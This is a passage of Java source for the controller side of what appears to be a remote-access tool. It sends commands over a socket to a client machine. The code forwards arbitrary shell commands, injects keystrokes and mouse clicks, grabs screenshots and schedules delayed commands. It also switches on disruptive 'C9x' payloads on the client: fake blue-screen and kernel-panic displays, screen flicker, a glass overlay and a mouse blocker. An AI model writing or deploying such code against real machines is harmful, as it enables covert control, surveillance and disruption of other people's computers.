							codes.add(KeyEvent.VK_ESCAPE);
							isPress.add(false);
							break;
						case "%%":
							codes.add(KeyEvent.VK_SHIFT);
							isPress.add(true);
							codes.add(specialKeyCodes.get('%'));
							isPress.add(true);
							codes.add(specialKeyCodes.get('%'));
							isPress.add(false);
							codes.add(KeyEvent.VK_SHIFT);
							isPress.add(false);
							break;
						default:
							System.err.println("The sequence " + subcmd + " is not valid. This entry will be ignored.");
							break;
						}
					}
					i += 2;
					continue;
				}
				if(specialKeyCodes.containsKey(ch)) {
					codes.add(KeyEvent.VK_SHIFT);
					isPress.add(true);
					codes.add(specialKeyCodes.get(ch));
					isPress.add(true);
					codes.add(specialKeyCodes.get(ch));
					isPress.add(false);
					codes.add(KeyEvent.VK_SHIFT);
					isPress.add(false);
				}
				else {
					if(Character.isUpperCase(ch)) {
						codes.add(KeyEvent.VK_SHIFT);
						isPress.add(true);
					}
					
					codes.add(KeyEvent.getExtendedKeyCodeForChar(ch));
					isPress.add(true);
					codes.add(KeyEvent.getExtendedKeyCodeForChar(ch));
					isPress.add(false);
					
					if(Character.isUpperCase(ch)) {
						codes.add(KeyEvent.VK_SHIFT);
						isPress.add(false);
					}
				}
			}
			cout.writeInt(codes.size());
			Iterator<Integer> codeIterator = codes.iterator();
			Iterator<Boolean> pressIterator = isPress.iterator();
			while(codeIterator.hasNext()) {
				cout.writeInt(codeIterator.next());
				cout.writeBoolean(pressIterator.next());
			}
			
			if(cin.readByte() == RET_SUCCESS) {
				System.out.println("String successfully inserted.");
			}
			else {
				System.out.println("An error occurred when trying to insert string.");
			}
		}
			break;
		case "clientver":
		{
			cout.writeByte(CMD_GETVER);
			System.out.println(cin.readUTF());
		}
			break;
		case "raw":
		{
			if(command.length() <= 4) {
				System.out.println("Usage: Raw <CMD>");
				break;
			}
			cout.writeByte(CMD_RAW);
			cout.writeUTF(command.substring(4));
			System.out.println(cin.readUTF());
		}
			break;
		case "ldblclick":
		{
			cout.writeByte(CMD_LDBLCLICK);
			if(cin.readByte() == RET_SUCCESS) {
				System.out.println("Double click successful.");
			}
			else {
				System.err.println("An error occurred.");
			}
		}
			break;
		//Only included for debug use
		case "mdown":
		{
			cout.writeByte(CMD_MDOWN);
			cout.writeInt(Integer.parseInt(command.substring(6)));
			if(cin.readByte() == RET_SUCCESS) {
				System.out.println("Success");
			}
			else {
				System.err.println("Error");
			}
		}
			break;
		case "mup":
		{
			cout.writeByte(CMD_MUP);
			cout.writeInt(Integer.parseInt(command.substring(4)));
			if(cin.readByte() == RET_SUCCESS) {
				System.out.println("Success");
			}
			else {
				System.err.println("Error");
			}
		}
			break;
		case "monitor":
		{
			int portNumber;
			String name = null;
			try {
				command = command.substring(8);
				if(command.indexOf(' ') < 0) {
					portNumber = Integer.parseInt(command);
				}
				else {
					portNumber = Integer.parseInt(command.substring(0, command.indexOf(' ')));
					name = command.substring(command.indexOf(' ') + 1);
				}
			}
			catch(StringIndexOutOfBoundsException | NumberFormatException e) {
				System.out.println("Usage: Monitor <PORT> [NAME]");
				break;
			}
			System.out.println("Setting up server...");
			MonitorServer monitor = ((name == null) ? new MonitorServer(portNumber) : new MonitorServer(portNumber, name));
			new Thread(monitor, "monitor server").start();
			System.out.println("Notifying client...");
			
			try {
				cout.writeByte(CMD_MONITOR);
				cout.writeInt(portNumber);
				if(cin.readByte() != RET_SUCCESS) {
					throw new IOException("Client responded with an error message");
				}
			}
			catch(IOException e) {
				System.err.println("Error when trying to notify client:");
				e.printStackTrace();
				System.err.println("The Monitor service will be cancelled.");
				monitor.forceStop();
				break;
			}
			
			System.out.println("The Monitor service has been successfully activated.");
			
		}
			break;
		case "executeafter":
		case "runafter":
		{
			try {
				int millis;
				int index = command.indexOf(" ");
				if(index < 0) {
					System.out.println("Usage: RunAfter/ExecuteAfter <MILLIS> <CTRLCMD>");
					break;
				}
				command = command.substring(index + 1);
				millis = Integer.parseInt(command.substring(0, command.indexOf(" ")));
				String cmdToExecute = command.substring(command.indexOf(" ") + 1);
				timer.schedule(new ExecuteCommandAfter(cmdToExecute), millis);
				System.out.println("Command successfully scheduled.");
			}
			catch(StringIndexOutOfBoundsException | IllegalArgumentException e) {
				System.out.println("Usage: RunAfter/ExecuteAfter <MILLIS> <CTRLCMD>");
				break;
			}
		}
			break;
		case "c9x":
		{
			String[] tokens = command.toLowerCase().split(" ");
			if(tokens.length < 3) {
				System.out.println("Usage: C9x <NAME> <ON/OFF>");
				break;
			}
			boolean enable;
			if(tokens[2].equals("on")) {
				enable = true;
			}
			else if(tokens[2].equals("off")) {
				enable = false;
			}
			else {
				System.out.println("Usage: C9x <NAME> <ON/OFF>");
				break;
			}
			byte code = C9X_INVALID;
			if(tokens[1].contains("_")) {
				String[] tokens2 = tokens[1].split("_");
				if(tokens2.length < 2) {
					System.out.println("Usage: C9x <NAME> <ON/OFF>");
					break;
				}
				if(tokens2[0].equals("ec85") || tokens2[0].equals("bsod") || tokens2[0].equals("kernelpanic")) {
					switch(tokens2[1]) {
					case "win10":
					case "win8":
						code = C9X_BSODWIN10;
						break;
					case "win7":
					case "winvista":
						code = C9X_BSODWIN7;
						break;
					case "macosx":
						code = C9X_KPMACOSX;
						break;
					case "linux":
						code = C9X_KPLINUX;
						break;
					case "auto":
						code = C9X_BSODAUTO;
						break;
					default:
						System.err.println("Error: The specified OS is not supported. See Help C9x for a list of supported OS names.");
						break;
					}
				}
				else {
					System.out.println("Usage: C9x <NAME> <ON/OFF>");
					break;
				}
			}
			else {
				switch(tokens[1]) {
				case "glasspanel":
				case "c9dc":
					code = C9X_GPANEL;
					break;
				case "flicker":
				case "c9c8":
					code = C9X_FLICKER;
					break;
				case "mouseblocker":
				case "c9dd":
					code = C9X_MBLOCKER;
					break;
				default:
					System.out.println("Error: \"" + tokens[1] + "\" is not a valid C9x program name.");
					break;
				}
			}
			if(code == C9X_INVALID) {
				break;
			}
			
			cout.writeByte(CMD_C9X);
			cout.writeBoolean(enable);
			cout.writeByte(code);
			if(cin.readByte() != RET_SUCCESS) {
				System.err.println("An error occurred when working with the C9x program.");
			}
			else {
				System.out.println("Success");
			}
		}
			break;
		case "cmd":
			if(command.length() <= 4) {
				System.out.println("Usage: Cmd <CMD>");
				break;
			}
			command = command.substring(4);
		default:
		{
			cout.writeByte(CMD_RUNCMD);
			cout.writeUTF(command);
			System.out.println(cin.readUTF());
		}
			break;
		}
		//BOOKMARK Command switch end point
	}

	@Override
	public void mouseClicked(MouseEvent e) {
		int x = e.getX() * 3/2;
		int y = e.getY() * 3/2;
		frame.dispose();
		block = false;
		try {
			cout.writeByte(CMD_MMOVE);
			cout.writeInt(x);
			cout.writeInt(y);
			if(cin.readByte() == RET_SUCCESS) {
				if(e.getClickCount() == 2 && e.getButton() == MouseEvent.BUTTON1) {
					cout.writeByte(CMD_LDBLCLICK);
					if(cin.readByte() == RET_SUCCESS) {
						System.out.println("Double click successful.");
					}
					else {
						System.out.println("An error occurred when trying to generate a double click.");
					}
				}
				else {
					switch(e.getButton()) {
					case MouseEvent.BUTTON1:
						cout.writeByte(CMD_LCLICK);
						break;
					case MouseEvent.BUTTON2:
						cout.writeByte(CMD_MCLICK);
						break;
					case MouseEvent.BUTTON3:
						cout.writeByte(CMD_RCLICK);
						break;
					default: break;
					}
					if(cin.readByte() == RET_SUCCESS) {
						System.out.println("Click successful.");
					}
					else {
						System.out.println("An error occurred when trying to generate a click.");
					}
				}
			}
			else {
				System.out.println("An error occurred when trying to move mouse.");
			}
		}
		catch(IOException ioe) {
			System.err.println("Error when attempting to make click at location:");
			ioe.printStackTrace();
		}
	}
	@Override
	public void mouseEntered(MouseEvent e) {}
	@Override
	public void mouseExited(MouseEvent e) {}
	@Override
	public void mousePressed(MouseEvent e) {}
	@Override
	public void mouseReleased(MouseEvent e) {}
	@Override
	public void windowClosed(WindowEvent arg0) {
		block = false;
	}
	
	static class ExecuteCommandAfter extends TimerTask {
		String cmd;
		public ExecuteCommandAfter(String command) {
			cmd = command;
		}
		@Override
		public void run() {
			try {
				System.out.println("\nExecution of scheduled command:");
				System.out.println(cmd);
				System.out.println("---");
				parseCommand(cmd);
				System.out.print(">>> ");
			}
			catch(Exception e) {
				System.err.println("Fatal Error in RunAfter/ExecuteAfter:");
				e.printStackTrace();
				System.out.println("The program will now exit.");
				System.exit(0);
			}
		}
	}
	static class ShutdownHook extends Thread {
		@Override
		public void run() {
			try {
				broadcast.stop();
				wait.stop();
				timer.cancel();
				timer.purge();
				for(Socket s : clients) {
					try {
						s.close();
					}
					catch(IOException e) {
						System.err.println("An IOException was thrown when trying to close a client's connection.");
					}
				}
				server.close();
				dSocket.close();
				cout.close();
				cin.close();
			}
			catch(NullPointerException e1) {
			}
			catch(Exception e2) {
				System.err.println("An error occurred when trying to close resources:");
				e2.printStackTrace();
			}
			System.gc();
			System.out.println("Exited.");
		}
	}
}

class InteractiveScreenshotFrame extends JFrame {
	/**
	 * 
	 */
	private static final long serialVersionUID = -9127407853210604308L;
	JLabel img;

	static DataOutputStream cout = CtrlServer.cout;
	static DataInputStream cin = CtrlServer.cin;
	
	
	private static class ISFMouseListener implements MouseListener {
		InteractiveScreenshotFrame parent;
		
		public ISFMouseListener(InteractiveScreenshotFrame isf) {
			parent = isf;
		}
		
		void updateParentImage() {
			try {
				cout.writeByte(CMD_SSHOT);
				if(cin.readByte() == RET_SUCCESS) {
					int size = cin.readInt();
					byte[] dataRaw = new byte[size];
					cin.readFully(dataRaw);
					ByteArrayInputStream dataStream = new ByteArrayInputStream(dataRaw);
					BufferedImage img = ImageIO.read(dataStream);
					dataStream.close();
					parent.updateImg(img.getScaledInstance((int) (img.getWidth() * CtrlServer.IMG_SCALE), (int) (img.getHeight() * CtrlServer.IMG_SCALE), Image.SCALE_SMOOTH));
				}
				else {
					System.err.println("An error occurred when trying to update the screenshot.");
				}
			}
			catch(IOException ioe) {
				System.err.println("An error occurred when trying to update the screenshot.");
			}
		}
		
		@Override
		public void mouseClicked(MouseEvent e) {}
		@Override
		public void mousePressed(MouseEvent e) {
			int x = e.getX() * 3/2;
			int y = e.getY() * 3/2;
			
			try {
				cout.writeByte(CMD_MMOVE);
				cout.writeInt(x);
				cout.writeInt(y);
				if(cin.readByte() == RET_ERR) {
					System.err.println("Error when trying to move mouse.");
					return;
				}
				cout.writeByte(CMD_MDOWN);
				switch(e.getButton()) {
				case MouseEvent.BUTTON1:
					cout.writeInt(InputEvent.BUTTON1_MASK);
					break;
				case MouseEvent.BUTTON2:
					cout.writeInt(InputEvent.BUTTON2_MASK);
					break;
				case MouseEvent.BUTTON3:
					cout.writeInt(InputEvent.BUTTON3_MASK);
					break;
				default: break;
				}
				if(cin.readByte() == RET_ERR) {
					System.err.println("Error when transmitting mouse action.");
				}
			}
			catch(IOException ioe) {
				System.err.println("Error when transmitting mouse action:");
				ioe.printStackTrace();
			}
			updateParentImage();
		}
		@Override
		public void mouseReleased(MouseEvent e) {
			int x = e.getX() * 3/2;
			int y = e.getY() * 3/2;
			
			try {
				cout.writeByte(CMD_MMOVE);
				cout.writeInt(x);
				cout.writeInt(y);
				if(cin.readByte() == RET_ERR) {
					System.err.println("Error when trying to move mouse.");
					return;
				}
				cout.writeByte(CMD_MUP);
				switch(e.getButton()) {
				case MouseEvent.BUTTON1:
					cout.writeInt(InputEvent.BUTTON1_MASK);
					break;
				case MouseEvent.BUTTON2:
					cout.writeInt(InputEvent.BUTTON2_MASK);
					break;
				case MouseEvent.BUTTON3:
					cout.writeInt(InputEvent.BUTTON3_MASK);
					break;
				default: break;
				}
				if(cin.readByte() == RET_ERR) {
					System.err.println("Error when transmitting mouse action.");
				}
			}
			catch(IOException ioe) {
				System.err.println("Error when transmitting mouse action:");
				ioe.printStackTrace();
			}
			updateParentImage();
		}
		@Override
		public void mouseEntered(MouseEvent e) {}
		@Override
		public void mouseExited(MouseEvent e) {}
	}
	
	public InteractiveScreenshotFrame() {
		super();
		this.setResizable(false);
		this.setTitle("Interactive screenshot from client");
		this.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		this.addMouseListener(new ISFMouseListener(this));
	}
	public void initLabel(JLabel label) {
		img = label;
		this.add(img);
	}
	public void updateImg(Image image) {
		img.setIcon(new ImageIcon(image));
		this.pack();
		this.setVisible(true);
	}
}

class ScreenshotMenuBar extends JMenuBar {
	/**
	 * 
	 */
	private static final long serialVersionUID = 8026267770822307686L;
	JFrame parent;
	JLabel parentLabel;
	BufferedImage imgShowing;
	static DataOutputStream cout = CtrlServer.cout;
	static DataInputStream cin = CtrlServer.cin;
	
	static String getExtension(File file) {
		return getExtension(file.getName());
	}
	static String getExtension(String fileName) {
		int extIndex = fileName.lastIndexOf('.');
		if(extIndex < 0)
			return null;
		String ext;
		try {
			ext = fileName.substring(extIndex + 1);
		}
		catch(StringIndexOutOfBoundsException e) {
			return null;
		}
		return ext;
	}
	static boolean isValidImgExtension(String ext) {
		if(ext == null)
			return false;
		if(ext.equals("jpg") || ext.equals("jpeg") || ext.equals("png") || ext.equals("gif")
				|| ext.equals("bmp")) {
			return true;
		}
		return false;
	}
	static class ImageFileFilter extends FileFilter {

		@Override
		public boolean accept(File f) {
			if(f.isDirectory())
				return true;
			
			String ext = getExtension(f);
			if(ext == null)
				return false;
			return isValidImgExtension(ext);
		}
		
		@Override
		public String getDescription() {
			return "Images (*.jpg, *.jpeg, *.png, *.gif, *.bmp)";
		}
	}
	
	public ScreenshotMenuBar(JFrame f, JLabel l, BufferedImage img) {
		super();
		parent = f;
		parentLabel = l;
		imgShowing = img;
		JMenu screenshotMenu = new JMenu("Actions");
		screenshotMenu.setMnemonic(KeyEvent.VK_A);
		
		JMenuItem screenshotSave = new JMenuItem("Save", KeyEvent.VK_S);
		screenshotSave.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_S, ActionEvent.CTRL_MASK));
		JMenuItem screenshotUpdate = new JMenuItem("Update", KeyEvent.VK_U);
		screenshotUpdate.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_U, ActionEvent.CTRL_MASK));
		
		screenshotUpdate.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				try {
					cout.writeByte(CMD_SSHOT);
					if(cin.readByte() == RET_SUCCESS) {
						int size = cin.readInt();
						byte[] dataRaw = new byte[size];
						cin.readFully(dataRaw);
						ByteArrayInputStream dataStream = new ByteArrayInputStream(dataRaw);
						imgShowing = ImageIO.read(dataStream);
						dataStream.close();
						Image img = imgShowing.getScaledInstance(
								(int) (imgShowing.getWidth() * CtrlServer.IMG_SCALE), 
								(int) (imgShowing.getHeight() * CtrlServer.IMG_SCALE), 
								Image.SCALE_SMOOTH);
						
						parentLabel.setIcon(new ImageIcon(img));
						parent.repaint();
					}
					else {
						JOptionPane.showMessageDialog(parent, "An error occurred when trying to obtain screenshot.", "Error", JOptionPane.ERROR_MESSAGE);
					}
				}
				catch(IOException e1) {
					JOptionPane.showMessageDialog(parent, "An IOException was thrown when trying to obtain screenshot.", "Error", JOptionPane.ERROR_MESSAGE);
				}
			}
		});
		screenshotSave.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				JFileChooser fc = new JFileChooser();
				fc.setAcceptAllFileFilterUsed(false);
				fc.setFileFilter(new ImageFileFilter());
				int ret = fc.showSaveDialog(parent);
				if(ret == JFileChooser.APPROVE_OPTION) {
					File dest = fc.getSelectedFile();
					String format = getExtension(dest);
					if(!isValidImgExtension(format)) {
						format = "png";
						dest = new File(dest.getPath() + ".png");
						JOptionPane.showMessageDialog(parent, "The extension entered was not valid or no extension was provided.\nThe default extension of PNG will be used.", "Warning", JOptionPane.WARNING_MESSAGE);
					}
					try {
						ImageIO.write(imgShowing, format, dest);
					}
					catch(IllegalArgumentException | IOException e1) {
						JOptionPane.showMessageDialog(parent, "An error occurred when trying to save.", "Error", JOptionPane.ERROR_MESSAGE);
					}
				}
			}
		});
		
		screenshotMenu.add(screenshotSave);
		screenshotMenu.add(screenshotUpdate);
		this.add(screenshotMenu);
	}
	public void setParent(JFrame f) {
		parent = f;
	}
	public void setImgShowing(BufferedImage img) {
		imgShowing = img;
	}
}

